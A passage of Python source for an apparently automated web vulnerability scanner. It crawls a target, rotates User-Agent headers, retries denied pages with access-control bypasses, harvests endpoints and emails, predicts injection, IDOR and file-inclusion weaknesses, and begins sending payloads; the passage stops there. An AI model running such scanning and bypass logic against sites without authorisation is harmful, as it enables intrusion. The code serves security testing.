            logger.error(f"Error during cleanup: {e}", exc_info=True)

    def __del__(self):
        """
        Destructor - chiama cleanup quando oggetto viene distrutto.

        Garantisce che le risorse vengano rilasciate anche se cleanup()
        non viene chiamato esplicitamente.
        """
        try:
            self.cleanup()
        except:
            # Ignora errori nel destructor per evitare problemi durante shutdown
            pass

    def _rotate_user_agent(self):
        """Rotate User-Agent for each request"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def normalize_url(self, url):
        """Normalize URL to avoid duplicates"""
        # Remove fragment
        url = url.split('#')[0]
        # Remove trailing slash
        url = url.rstrip('/')
        # Sort query parameters
        parsed = urlparse(url)
        if parsed.query:
            params = sorted(parse_qs(parsed.query).items())
            query = urllib.parse.urlencode(params, doseq=True)
            url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, query, ''
            ))
        return url
    
    def resolve_initial_redirects(self):
        """Resolve initial redirects to get the actual target URL"""
        try:
            # Follow redirects for the initial URL
            response = self.session.get(self.target_url, timeout=15, verify=False, allow_redirects=True)
            final_url = response.url
            
            if final_url != self.target_url:
                logger.info(f"Target URL redirected: {self.target_url} → {final_url}")
                self.target_url = final_url.rstrip('/')
                self.parsed_url = urlparse(self.target_url)
                
            return True
        except Exception as e:
            logger.error(f"Failed to resolve initial URL: {e}")
            return False
    
    def is_valid_url(self, url):
        """Check if URL should be crawled"""
        parsed = urlparse(url)
        
        # Check if same domain
        if parsed.netloc != self.parsed_url.netloc:
            return False
        
        # Skip static file types (non-injectable resources)
        # NOTE: .js files are NOT skipped - they are analyzed for API endpoints and vulnerabilities
        skip_extensions = [
            '.jpg', '.jpeg', '.png', '.gif', '.pdf', '.zip', '.exe',
            '.css', '.svg', '.ico', '.woff', '.woff2', '.ttf', '.eot',
            '.mp3', '.mp4', '.avi', '.mov', '.webm', '.webp',
            '.map', '.min.css'
        ]
        url_lower = url.lower().split('?')[0]  # Ignore query params for extension check
        if any(url_lower.endswith(ext) for ext in skip_extensions):
            return False
        
        # Skip logout URLs
        if 'logout' in url.lower() or 'signout' in url.lower():
            return False
        
        return True
    
    def extract_urls_from_js(self, js_content, base_url):
        """Extract API endpoints and URLs from JavaScript"""
        urls = set()
        
        # Common API patterns
        api_patterns = [
            r'["\']/(api/[^"\']+)["\']',
            r'["\']/(v\d+/[^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.[get|post|put|delete]+\(["\']([^"\']+)["\']',
            r'\.ajax\({[^}]*url:\s*["\']([^"\']+)["\']',
            r'XMLHttpRequest.*open\([^,]+,\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, js_content, re.I)
            for match in matches:
                url = urljoin(base_url, match)
                urls.add(url)
        
        return urls
    
    def crawl_page(self, url, depth=0):
        """Crawl a single page and extract information with extended analysis"""
        if depth > self.max_depth or len(self.visited_urls) >= self.max_pages:
            return
        
        normalized_url = self.normalize_url(url)
        if normalized_url in self.visited_urls:
            return
        
        self.visited_urls.add(normalized_url)
        logger.info(f"Crawling: {url} (depth: {depth})")
        if self.verbose:
            print(f"\n🕷️ Crawling page: {url} (depth: {depth}, visited: {len(self.visited_urls)})")
        
        try:
            # Rotate user agent before each request
            self._rotate_user_agent()
            
            # Make request with dynamic timeout based on depth
            timeout = 15 if depth == 0 else 10
            # Always follow redirects - at depth > 0, not following redirects
            # causes empty response bodies when DVWA/apps redirect (session, HTTP→HTTPS)
            allow_redirects = True
            
            # Try normal request first
            response = self.session.get(url, timeout=timeout, verify=False, allow_redirects=allow_redirects)
            
            # If blocked (403/401) and we have bypasses, try them
            if response.status_code in [401, 403] and self.bypass_manager and self.bypass_manager.validated_bypasses:
                if self.verbose:
                    print(f"🚫 Access denied ({response.status_code}), trying bypasses...")
                
                for bypass in self.bypass_manager.validated_bypasses:
                    if self.verbose:
                        print(f"  🔧 Trying {bypass['type']}...")
                    
                    bypass_params = self.bypass_manager.apply_bypass_to_request(url, bypass)
                    if bypass_params:
                        try:
                            bypass_response = self.session.get(
                                bypass_params['url'],
                                headers=bypass_params.get('headers'),
                                timeout=timeout,
                                verify=False,
                                allow_redirects=allow_redirects
                            )
                            
                            if bypass_response.status_code not in [401, 403]:
                                if self.verbose:
                                    print(f"    ✅ Bypass successful! Status: {bypass_response.status_code}")
                                response = bypass_response
                                break
                            elif self.verbose:
                                print(f"    ❌ Still blocked: {bypass_response.status_code}")
                        except:
                            continue
            
            response.raise_for_status()

            # Skip non-parseable responses (CSS, images, fonts served without extension)
            # NOTE: application/javascript IS allowed - JS files are analyzed for API endpoints and vulns
            content_type = response.headers.get('Content-Type', '').lower()
            skip_content_types = ['text/css', 'image/', 'font/', 'audio/', 'video/',
                                  'application/octet-stream', 'application/zip',
                                  'application/pdf']
            if content_type and any(ct in content_type for ct in skip_content_types):
                if self.verbose:
                    print(f"  ⏭️ Skipping non-parseable response: {content_type}")
                return

            # Detect technologies
            if not self.results['technologies']:
                self.results['technologies'] = self.tech_detector.detect(response, url)
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract JavaScript content for analysis
            # ⚡ OTTIMIZZAZIONE: usa list + join invece di concatenazione ripetuta
            js_content_parts = []

            for script in soup.find_all('script'):
                src = script.get('src')
                if src:
                    js_url = urljoin(url, src)
                    self.results['javascript_files'].append(js_url)

                    # Analyze external JS
                    js_response = None
                    try:
                        # ⚡ Rate limiting
                        self.rate_limiter.wait()

                        js_response = self.session.get(js_url, timeout=5)

                        # Incrementa contatore HTTP requests
                        self.performance_monitor.increment_requests()

                        js_content_parts.append(js_response.text)
                        js_urls = self.extract_urls_from_js(js_response.text, url)
                        for js_url_found in js_urls:
                            if self.is_valid_url(js_url_found):
                                self.url_queue.put((js_url_found, depth + 1))
                                if '/api/' in js_url_found or '/v1/' in js_url_found:
                                    self.results['api_endpoints'].append(js_url_found)

                    except requests.Timeout:
                        logger.warning(f"Timeout fetching JS file: {js_url}")
                        self.performance_monitor.increment_errors()
                    except requests.ConnectionError:
                        logger.warning(f"Connection error fetching JS file: {js_url}")
                        self.performance_monitor.increment_errors()
                    except Exception as e:
                        logger.debug(f"Error fetching JS file {js_url}: {e}")
                        self.performance_monitor.increment_errors()
                    finally:
                        # ✅ CLEANUP: chiudi response
                        if js_response is not None:
                            try:
                                js_response.close()
                            except:
                                pass

                # Analyze inline JS
                if script.string:
                    js_content_parts.append(script.string)
                    js_urls = self.extract_urls_from_js(script.string, url)
                    for js_url_found in js_urls:
                        if self.is_valid_url(js_url_found):
                            self.url_queue.put((js_url_found, depth + 1))
                            if '/api/' in js_url_found or '/v1/' in js_url_found:
                                self.results['api_endpoints'].append(js_url_found)

            # ⚡ Crea js_content una volta sola (più efficiente di concatenazione ripetuta)
            js_content = "\n".join(js_content_parts)
            
            # Extract URLs for further crawling
            for tag in soup.find_all(['a', 'link']):
                href = tag.get('href')
                if href:
                    absolute_url = urljoin(url, href)
                    if self.is_valid_url(absolute_url):
                        self.url_queue.put((absolute_url, depth + 1))
            
            # Extract comments
            comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in text)
            for comment in comments:
                if any(keyword in comment.lower() for keyword in ['todo', 'fixme', 'hack', 'bug', 'debug']):
                    self.results['comments'].append(comment.strip())
            
            # Extract emails
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text)
            self.results['emails'].extend(list(set(emails)))
            
            # EXTENDED PARAMETER ANALYSIS - IMMEDIATE TESTING
            parsed = urlparse(url)
            
            # 1. Traditional query parameters (?param=value)
            if parsed.query:
                self.analyze_url_parameters_immediately(url, response.text)
            
            # 2. Hash fragments (#!/route, #/user/123)
            if parsed.fragment:
                self.analyze_hash_fragments_immediately(url, parsed.fragment, response.text)
            
            # 3. Path segments (/product/123, /user/admin)
            self.analyze_path_segments_immediately(url, response.text)
            
            # 4. Dynamic JavaScript parameters (SPA routing, API calls)
            if js_content:
                self.analyze_dynamic_js_parameters_immediately(url, js_content, response.text)
            
            # 5. Enhanced form analysis (test inputs immediately)
            self.analyze_forms_immediately(soup, url, response.text)
            
        except requests.RequestException as e:
            logger.error(f"Error crawling {url}: {e}")
            if depth == 0 and 'timeout' in str(e).lower():
                try:
                    logger.info(f"Retrying {url} with longer timeout...")
                    response = self.session.get(url, timeout=30, verify=False)
                    self.crawl_page(url, depth)
                except:
                    pass
    
    def analyze_url_parameters_immediately(self, url, response_text):
        """Enhanced parameter analysis with behavioral fingerprinting"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if self.verbose:
            print(f"\n🔍 ANALYZING QUERY PARAMETERS: {url}")
        
        endpoint = {
            'url': url.split('?')[0],
            'method': 'GET',
            'parameters': [],
            'form': False,
            'source': 'query_parameters'
        }
        
        for param_name, values in params.items():
            param_value = values[0] if values else ''
            
            param_data = {
                'name': param_name,
                'location': 'query',
                'type': 'string',
                'value_sample': param_value,
                'predicted_vulns': []
            }
            
            # BEHAVIORAL ANALYSIS FIRST
            if self.verbose:
                print(f"\n  🧪 BEHAVIORAL FINGERPRINTING: {param_name}")
            
            behavioral_results = self.behavioral_engine.fingerprint_endpoint(
                self.session,
                endpoint['url'],
                param_name,
                rate_limiter=self.rate_limiter,  # Passa rate limiter globale
                parallel=True,  # Abilita parallelizzazione
                max_workers=5  # 5 probe in parallelo
            )
            
            # Store behavioral results
            self.results['behavioral_analysis_results'].append({
                'endpoint': endpoint['url'],
                'parameter': param_name,
                'results': behavioral_results
            })
            
            # Get behavioral predictions
            behavioral_vulns = self.behavioral_engine.predict_vulnerabilities(behavioral_results)
            
            # Traditional analysis
            all_param_names = list(params.keys())
            traditional_vulns = self.param_analyzer.analyze_parameter(
                param_name, param_value, response_text
            )

            # Apply semantic context boost
            param_context = self.param_analyzer.analyze_parameter_context(param_name, all_param_names)
            if param_context['confidence_boost'] > 0:
                for vuln in traditional_vulns:
                    vuln['confidence'] = min(vuln['confidence'] + param_context['confidence_boost'], 95)
                    vuln['context'] += f" (semantic: {param_context['context']})"
                    vuln['evidence'] += f" | {param_context['reason']}"

            # Merge and prioritize vulnerabilities
            merged_vulns = self.merge_vulnerability_predictions(
                behavioral_vulns,
                traditional_vulns,
                behavioral_results
            )
            
            if merged_vulns:
                if self.verbose:
                    print(f"  📍 Parameter '{param_name}' → predicted vulnerabilities:")
                    for vuln in merged_vulns:
                        confidence_level = self.get_confidence_level(vuln['confidence'])
                        print(f"    - {vuln['type'].upper()} ({confidence_level}): {vuln['evidence']}")
                        if 'behavioral_type' in vuln:
                            print(f"      🧬 Behavioral: {vuln['behavioral_type']}")
                
                for vuln in merged_vulns:
                    vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                        vuln['type'], self.results['technologies']
                    )
                    param_data['predicted_vulns'].append(vuln)
                
                # Test vulnerabilities immediately
                self.test_vulnerability_immediately(endpoint, param_data, merged_vulns)
            
            endpoint['parameters'].append(param_data)
        
        if endpoint['parameters']:
            self.endpoints.append(endpoint)
            if self.verbose:
                print(f"    ✅ Added endpoint with {len(endpoint['parameters'])} parameters")
    
    def merge_vulnerability_predictions(self, behavioral_vulns, traditional_vulns, behavioral_results):
        """Intelligently merge behavioral and traditional predictions"""
        merged = {}
        
        # Add behavioral predictions with boost
        for vuln in behavioral_vulns:
            key = vuln['type']
            merged[key] = vuln.copy()
            merged[key]['source'] = 'behavioral'
            merged[key]['behavioral_results'] = behavioral_results
        
        # Add or merge traditional predictions
        for vuln in traditional_vulns:
            key = vuln['type']
            if key in merged:
                # Boost confidence if both methods agree
                merged[key]['confidence'] = min(100, merged[key]['confidence'] + 15)
                merged[key]['evidence'] += f" + {vuln['evidence']}"
                merged[key]['source'] = 'both'
            else:
                merged[key] = vuln.copy()
                merged[key]['source'] = 'traditional'
        
        # Convert to list and sort by confidence
        result = list(merged.values())
        result.sort(key=lambda x: x['confidence'], reverse=True)
        
        return result
    
    def get_confidence_level(self, confidence):
        """Convert numeric confidence to human-readable level"""
        if confidence >= 90:
            return "CRITICAL confidence"
        elif confidence >= 75:
            return "HIGH confidence"
        elif confidence >= 50:
            return "MEDIUM confidence"
        elif confidence >= 25:
            return "LOW confidence"
        else:
            return "MINIMAL confidence"
    
    def analyze_hash_fragments_immediately(self, url, fragment, response_text):
        """Analyze hash fragments for SPA routing and injection points"""
        if self.verbose:
            print(f"\n📱 ANALYZING HASH FRAGMENT: {url}#{fragment}")
        
        # Common SPA routing patterns
        spa_patterns = [
            r'#!/([^/]+)(?:/([^/]+))*',  # Angular: #!/route/param
            r'#/([^/]+)(?:/([^/]+))*',   # React/Vue: #/route/param  
            r'#([^/]+)(?:/([^/]+))*'     # Generic hash routing
        ]
        
        extracted_params = []
        
        for pattern in spa_patterns:
            matches = re.findall(pattern, fragment)
            if matches:
                if isinstance(matches[0], tuple):
                    for match in matches:
                        for param in match:
                            if param and param not in extracted_params:
                                extracted_params.append(param)
                else:
                    for param in matches:
                        if param and param not in extracted_params:
                            extracted_params.append(param)
        
        # Also split by common separators
        fragment_parts = re.split(r'[#!/&=?]', fragment)
        for part in fragment_parts:
            if part and len(part) > 1 and part not in extracted_params:
                extracted_params.append(part)
        
        if not extracted_params:
            return
        
        if self.verbose:
            print(f"  📍 Extracted hash parameters: {extracted_params}")
        
        # Create endpoint for hash parameters
        endpoint = {
            'url': url,
            'method': 'GET',
            'parameters': [],
            'form': False,
            'source': 'hash_fragment'
        }
        
        for i, param_value in enumerate(extracted_params):
            param_name = f"hash_param_{i}"
            
            param_data = {
                'name': param_name,
                'location': 'hash',
                'type': 'string',
                'value_sample': param_value,
                'predicted_vulns': []
            }
            
            # Analyze the parameter value for vulnerability patterns
            vulns = self.param_analyzer.analyze_parameter(
                param_value, param_value, response_text
            )
            
            # Additional SPA-specific vulnerabilities
            if param_value.isdigit():
                vulns.append({
                    'type': 'idor',
                    'confidence': 60, 
                    'context': 'spa_id_param',
                    'evidence': f'ID-like parameter in SPA route: {param_value}'
                })
            
            # Check for route injection possibilities
            if any(keyword in param_value.lower() for keyword in ['admin', 'user', 'account', 'profile']):
                vulns.append({
                    'type': 'access_control',
                    'confidence': 35,
                    'context': 'spa_route_access',
                    'evidence': f'Sensitive route parameter: {param_value}'
                })
            
            if vulns:
                if self.verbose:
                    print(f"    - '{param_value}' → predicted vulnerabilities:")
                    for vuln in vulns:
                        print(f"      * {vuln['type'].upper()} ({vuln['confidence']} confidence): {vuln['evidence']}")
                
                for vuln in vulns:
                    vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                        vuln['type'], self.results['technologies']
                    )
                    param_data['predicted_vulns'].append(vuln)
                
                # Test hash parameter vulnerabilities immediately
                self.test_vulnerability_immediately(endpoint, param_data, vulns)
            
            endpoint['parameters'].append(param_data)
        
        if endpoint['parameters']:
            self.endpoints.append(endpoint)
    
    def analyze_path_segments_immediately(self, url, response_text):
        """Analyze URL path segments for injection points with behavioral analysis"""
        parsed = urlparse(url)
        path_segments = [seg for seg in parsed.path.split('/') if seg]
        
        if len(path_segments) < 2:  # Need at least some path structure
            return
        
        if self.verbose:
            print(f"\n🛣️ ANALYZING PATH SEGMENTS: {'/'.join(path_segments)}")
        
        # Identify potentially injectable segments
        injectable_segments = []
        
        for i, segment in enumerate(path_segments):
            # Numeric segments (IDs)
            if segment.isdigit():
                injectable_segments.append({
                    'index': i,
                    'value': segment,
                    'type': 'numeric_id',
                    'name': f'path_id_{i}'
                })
            
            # Base64-like segments
            elif len(segment) > 10 and re.match(r'^[A-Za-z0-9+/=]+$', segment):
                injectable_segments.append({
                    'index': i, 
                    'value': segment,
                    'type': 'base64_like',
                    'name': f'path_b64_{i}'
                })
            
            # UUID-like segments
            elif re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', segment, re.I):
                injectable_segments.append({
                    'index': i,
                    'value': segment, 
                    'type': 'uuid',
                    'name': f'path_uuid_{i}'
                })
            
            # Alphanumeric tokens (session tokens, API keys)
            elif len(segment) > 8 and re.match(r'^[A-Za-z0-9]+$', segment):
                injectable_segments.append({
                    'index': i,
                    'value': segment,
                    'type': 'token',
                    'name': f'path_token_{i}'
                })
            
            # Filenames with extensions
            elif '.' in segment and len(segment) > 3:
                injectable_segments.append({
                    'index': i,
                    'value': segment,
                    'type': 'filename',
                    'name': f'path_file_{i}'
                })
        
        # Filter out already tested path segments to avoid redundancy
        new_injectable_segments = []
        for seg in injectable_segments:
            seg_key = (seg['index'], seg['value'])
            if seg_key not in self.tested_path_segments:
                new_injectable_segments.append(seg)
                self.tested_path_segments.add(seg_key)
        
        if not new_injectable_segments:
            return
        
        if self.verbose:
            print(f"  📍 Injectable path segments found: {len(new_injectable_segments)}")
            for seg in new_injectable_segments:
                print(f"    - {seg['name']}: {seg['value']} ({seg['type']})")
        
        # Create endpoint for path segments
        endpoint = {
            'url': url,
            'method': 'GET', 
            'parameters': [],
            'form': False,
            'source': 'path_segments'
        }
        
        for segment_info in new_injectable_segments:
            param_data = {
                'name': segment_info['name'],
                'location': 'path',
                'type': segment_info['type'],
                'value_sample': segment_info['value'],
                'path_index': segment_info['index'],
                'predicted_vulns': []
            }
            
            # BEHAVIORAL ANALYSIS per path segments
            if self.verbose:
                print(f"\n  🧪 BEHAVIORAL FINGERPRINTING: {segment_info['name']} (path segment)")
            
            behavioral_results = self.behavioral_engine.fingerprint_path_segment(
                self.session,
                self.target_url,
                segment_info['index'],
                segment_info['value'],
                path_segments
            )
            
            # Store behavioral results
            self.results['behavioral_analysis_results'].append({
                'endpoint': url,
                'parameter': segment_info['name'],
                'type': 'path_segment',
                'results': behavioral_results
            })
            
            # Get behavioral predictions
            behavioral_vulns = []
            
            # Check if it's a static file
            file_behavior = behavioral_results.get('file_operations', {})
            static_behavior = behavioral_results.get('static_serving', {})
            
            if file_behavior.get('type') == 'static_file':
                # Static files - NO path traversal vulnerabilities
                if segment_info['value'].endswith('.css'):
                    behavioral_vulns.append({
                        'type': 'css_injection',
                        'confidence': 20,  # Low because most CSS is static
                        'evidence': 'CSS file detected - potential for CSS injection if dynamically generated'
                    })
            elif file_behavior.get('type') == 'dynamic_file_handler':
                # Dynamic file handling - potential vulnerabilities
                behavioral_vulns.extend([
                    {
                        'type': 'lfi',
                        'confidence': 75,
                        'evidence': f'Dynamic file handler detected for: {segment_info["value"]}',
                        'behavioral_type': 'dynamic_file_processing'
                    },
                    {
                        'type': 'path_traversal',
                        'confidence': 70,
                        'evidence': 'Server processes file paths dynamically',
                        'behavioral_type': 'dynamic_path_handling'
                    }
                ])
            
            # Traditional analysis only for non-static resources
            traditional_vulns = []
            if not (file_behavior.get('type') == 'static_file' or static_behavior.get('type') == 'static_resource'):
                # Original vulnerability assignment logic, but only for dynamic resources
                if segment_info['type'] == 'numeric_id':
                    traditional_vulns.extend([
                        {
                            'type': 'sqli',
                            'confidence': 60,
                            'context': 'path_numeric_id',
                            'evidence': f'Numeric ID in path: {segment_info["value"]}'
                        },
                        {
                            'type': 'idor',
                            'confidence': 85,
                            'context': 'path_id_access',
                            'evidence': f'Direct object reference in path: {segment_info["value"]}'
                        }
                    ])
                
                elif segment_info['type'] in ['base64_like', 'uuid', 'token']:
                    traditional_vulns.extend([
                        {
                            'type': 'idor',
                            'confidence': 60,
                            'context': 'path_token_access',
                            'evidence': f'Token-like parameter in path: {segment_info["value"][:20]}...'
                        },
                        {
                            'type': 'auth_bypass',
                            'confidence': 35,
                            'context': 'path_session_token',
                            'evidence': f'Potential session token in path'
                        }
                    ])
            
            # Merge predictions
            merged_vulns = self.merge_vulnerability_predictions(
                behavioral_vulns,
                traditional_vulns,
                behavioral_results
            )
            
            if merged_vulns:
                if self.verbose:
                    print(f"    📊 {segment_info['name']} vulnerabilities (after behavioral analysis):")
                    for vuln in merged_vulns:
                        print(f"      * {vuln['type'].upper()} ({vuln['confidence']}): {vuln['evidence']}")
                
                for vuln in merged_vulns:
                    vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                        vuln['type'], self.results['technologies']
                    )
                    param_data['predicted_vulns'].append(vuln)
                
                # Test vulnerabilities immediately
                self.test_vulnerability_immediately(endpoint, param_data, merged_vulns)
            
            endpoint['parameters'].append(param_data)
        
        if endpoint['parameters']:
            self.endpoints.append(endpoint)
    
    def analyze_dynamic_js_parameters_immediately(self, url, js_content, response_text):
        """Analyze JavaScript for dynamic parameters and API calls"""
        if self.verbose:
            print(f"\n🔧 ANALYZING DYNAMIC JAVASCRIPT PARAMETERS")
        
        dynamic_params = []
        
        # Pattern 1: Angular/React route parameters
        route_patterns = [
            r'\$routeParams\.(\w+)',  # Angular $routeParams.id
            r'params\.(\w+)',         # React/Vue params.id
            r'useParams\(\)\.(\w+)',  # React hooks
            r'\$stateParams\.(\w+)',  # UI-Router
        ]
        
        for pattern in route_patterns:
            matches = re.findall(pattern, js_content, re.I)
            for match in matches:
                if match not in [p['name'] for p in dynamic_params]:
                    dynamic_params.append({
                        'name': match,
                        'source': 'spa_routing',
                        'pattern': pattern
                    })
        
        # Pattern 2: API endpoint parameters
        api_patterns = [
            r'fetch\(["\'].*?/(\w+)/(\w+)["\']',  # fetch('/users/123')
            r'axios\.[get|post|put|delete]\(["\'].*?/(\w+)["\']',  # axios.get('/user/123')
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, js_content, re.I)
            for match in matches:
                if isinstance(match, tuple):
                    for param in match:
                        if param and param.isdigit() and len(param) < 10:
                            dynamic_params.append({
                                'name': f'api_id_{param}',
                                'source': 'api_endpoint',
                                'value': param
                            })
        
        # Filter out already tested parameters to avoid loops/redundancy
        new_dynamic_params = []
        for p in dynamic_params:
            param_key = (p['source'], p['name'])
            if param_key not in self.tested_dynamic_params:
                new_dynamic_params.append(p)
                self.tested_dynamic_params.add(param_key)
        
        if not new_dynamic_params:
            return
        
        if self.verbose:
            print(f"  📍 Dynamic JavaScript parameters found: {len(new_dynamic_params)}")
            for param in new_dynamic_params:
                print(f"    - {param['name']} (source: {param['source']})")
        
        # Create endpoint for JavaScript parameters
        endpoint = {
            'url': url,
            'method': 'POST',  # Most dynamic params are POST
            'parameters': [],
            'form': False,
            'source': 'javascript_dynamic'
        }
        
        for param_info in new_dynamic_params:
            param_data = {
                'name': param_info['name'],
                'location': 'javascript',
                'type': 'dynamic',
                'source_type': param_info['source'],
                'predicted_vulns': []
            }
            
            # Predict vulnerabilities for dynamic parameters
            vulns = self.param_analyzer.analyze_parameter(
                param_info['name'], 
                param_info.get('value', ''), 
                response_text
            )
            
            # Add JavaScript-specific vulnerabilities
            if param_info['source'] == 'spa_routing':
                vulns.append({
                    'type': 'xss',
                    'confidence': 60,
                    'context': 'spa_dom_xss',
                    'evidence': f'SPA routing parameter susceptible to DOM XSS: {param_info["name"]}'
                })
            
            if vulns:
                if self.verbose:
                    print(f"    📊 {param_info['name']} vulnerabilities:")
                    for vuln in vulns:
                        print(f"      * {vuln['type'].upper()} ({vuln['confidence']}): {vuln['evidence']}")
                
                for vuln in vulns:
                    vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                        vuln['type'], self.results['technologies']
                    )
                    param_data['predicted_vulns'].append(vuln)
                
                # Test JavaScript parameter vulnerabilities immediately
                self.test_vulnerability_immediately(endpoint, param_data, vulns)
            
            endpoint['parameters'].append(param_data)
        
        if endpoint['parameters']:
            self.endpoints.append(endpoint)
    
    def analyze_forms_immediately(self, soup, url, response_text):
        """Enhanced form analysis with immediate testing"""
        forms = soup.find_all('form')
        if not forms:
            return

        if self.verbose:
            print(f"\n📝 ANALYZING FORMS: {len(forms)} found")

        for form_idx, form in enumerate(forms):
            action = urljoin(url, form.get('action', url))
            method = form.get('method', 'GET').upper()

            if self.verbose:
                print(f"  📋 Form {form_idx + 1}: {method} {action}")

            # Extract all form inputs
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                    'required': input_tag.get('required') is not None,
                    'placeholder': input_tag.get('placeholder', ''),
                    'id': input_tag.get('id', '')
                }

                if input_data['name']:
                    inputs.append(input_data)

            if not inputs:
                continue

            # Create endpoint for form
            endpoint = {
                'url': action,
                'method': method,
                'parameters': [],
                'form': True,
                'source': 'html_form'
            }

            # Get all input names for semantic context analysis
            all_input_names = [inp['name'] for inp in inputs if inp.get('name')]

            # ===== PHASE 1: Build ALL parameters FIRST (with values) =====
            # Critical: we must have the complete form data before testing,
            # otherwise POST requests will be missing fields (e.g. Submit button)
            params_with_vulns = []  # [(param_data, vulns)]

            for input_data in inputs:
                param_location = 'query' if method.upper() == 'GET' else 'body'

                param_data = {
                    'name': input_data['name'],
                    'location': param_location,
                    'type': input_data['type'],
                    'value': input_data['value'],  # Preserve form default value
                    'required': input_data['required'],
                    'predicted_vulns': []
                }

                # Skip submit/button types for vulnerability analysis but keep in parameters
                if input_data['type'] in ('submit', 'button', 'image', 'reset'):
                    endpoint['parameters'].append(param_data)
                    continue

                # Get form encoding type (for XXE detection)
                form_enctype = form.get('enctype', 'application/x-www-form-urlencoded')

                # Analyze form input for vulnerabilities
                vulns = self.param_analyzer.analyze_parameter(
                    input_data['name'],
                    input_data['value'],
                    response_text,
                    content_type=form_enctype
                )

                # Apply semantic context boost
                param_context = self.param_analyzer.analyze_parameter_context(
                    input_data['name'],
                    all_input_names
                )
                if param_context['confidence_boost'] > 0:
                    for vuln in vulns:
                        vuln['confidence'] = min(vuln['confidence'] + param_context['confidence_boost'], 95)
                        vuln['context'] += f" (semantic: {param_context['context']})"

                # Add form-specific vulnerabilities
                if input_data['type'] == 'file':
                    vulns.append({
                        'type': 'file_upload',
                        'confidence': 85,
                        'context': 'file_upload_form',
                        'evidence': f'File upload input: {input_data["name"]}'
                    })

                if input_data['type'] == 'hidden':
                    for vuln in vulns:
                        if vuln.get('confidence', 0) < 70:
                            vuln['confidence'] = min(vuln['confidence'] + 15, 90)
                        vuln['context'] = vuln.get('context', '') + ' (hidden_field)'
                        vuln['evidence'] = vuln.get('evidence', '') + f' - Hidden parameter: {input_data["name"]}'

                if vulns:
                    if self.verbose:
                        print(f"    📍 Input '{input_data['name']}' ({input_data['type']}) vulnerabilities:")
                        for vuln in vulns:
                            print(f"      * {vuln['type'].upper()} ({vuln['confidence']}): {vuln['evidence']}")

                    for vuln in vulns:
                        vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                            vuln['type'], self.results['technologies']
                        )
                        param_data['predicted_vulns'].append(vuln)

                    params_with_vulns.append((param_data, vulns))

                endpoint['parameters'].append(param_data)

            # ===== PHASE 2: Test vulnerabilities AFTER all fields are collected =====
            # Now endpoint['parameters'] has ALL form fields with their default values
            for param_data, vulns in params_with_vulns:
                self.test_vulnerability_immediately(endpoint, param_data, vulns)

            if endpoint['parameters']:
                self.endpoints.append(endpoint)
    
    def _capture_baseline(self, endpoint, param):
        """
        Capture a baseline response for differential analysis.
        Sends a benign value and records response text + timing.

        Returns:
            (baseline_text, baseline_time) or (None, 0) on failure
        """
        try:
            benign_value = param.get('value', '') or 'test123'
            self.rate_limiter.wait()
            start = time.time()
            response = self._send_raw_payload(endpoint, param, benign_value)
            elapsed = time.time() - start

            if response is not None:
                text = response.text or ''
                response.close()
                return text, elapsed
        except Exception:
            pass
        return None, 0

    def test_vulnerability_immediately(self, endpoint, param, vulnerabilities):
        """
        Test vulnerabilities immediately when found.

        Unified detection flow:
        1. Capture baseline response for differential analysis
        2. Collect ALL payloads (native PayloadDB + external wordlists + internal fallback)
        3. For each payload: send request -> unified analysis with baseline
        4. For SQLi/RCE: also run timing-based multi-request techniques
        """
        if not vulnerabilities:
            return

        param_name = param['name']
        endpoint_url = endpoint['url']

        if self.verbose:
            print(f"\n  Testing: {endpoint_url} parameter '{param_name}'")

        # Filter already-tested vulnerabilities for this parameter
        # Pass confidence to enable dynamic limit calculation
        vulns_to_test = []
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', vuln.get('vulnerability', 'unknown'))
            vuln_confidence = vuln.get('confidence', None)

            if self.should_test_parameter(param_name, vuln_type, endpoint_url, confidence=vuln_confidence):
                vulns_to_test.append(vuln)
            else:
                if self.verbose:
                    print(f"  Skipping {vuln_type.upper()} for '{param_name}' - already tested")

        if not vulns_to_test:
            return

        # Capture baseline ONCE for all vuln types on this parameter
        baseline_text, baseline_time = self._capture_baseline(endpoint, param)
        if self.verbose and baseline_text is not None:
            print(f"    Baseline captured: {len(baseline_text)} bytes, {baseline_time:.2f}s")

        for vuln in vulns_to_test:
            vuln_type = vuln.get('type', vuln.get('vulnerability', 'unknown'))
            confidence = vuln.get('confidence', 'unknown')

            # Wrap each vuln type in try/except so a failure in one doesn't skip the rest
            try:
                if self.verbose:
                    print(f"  Testing {vuln_type.upper()} (confidence: {confidence})")

                # ===== UNIFIED FLOW: Collect ALL payloads from all sources =====
                all_payloads = self._collect_all_payloads(vuln_type, endpoint=endpoint)

                if not all_payloads:
                    if self.verbose:
                        print(f"    No payloads available for {vuln_type}")
                    # Do NOT mark as tested when no payloads were available -
                    # this allows retesting on different URLs where payloads might exist
                    continue

                if self.verbose:
                    print(f"    Collected {len(all_payloads)} payloads")

                # ===== PHASE 1: Static payloads =====
                found = False
                tested_count = 0
                max_payloads = 150
